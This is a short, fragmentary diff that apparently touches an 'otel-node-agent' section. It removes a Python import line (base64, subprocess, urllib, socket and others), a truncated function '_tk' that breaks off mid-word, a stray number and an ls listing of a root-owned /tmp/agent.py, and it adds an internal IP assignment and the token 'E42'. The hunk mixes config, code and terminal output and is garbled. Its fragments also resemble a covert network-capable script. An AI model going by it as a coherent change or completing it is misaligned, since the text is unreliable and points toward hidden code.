@@ -1,6 +1,4 @@
 [otel-node-agent-skgkk]
-import time,base64,subprocess,urllib.request,json,os,re,socket
-def _tk():
-    tr
-0
--rw-r--r--    1 root     root          2676 Sep  8 19:27 /tmp/agent.py
+MY=10.42.155.190
+
+E42
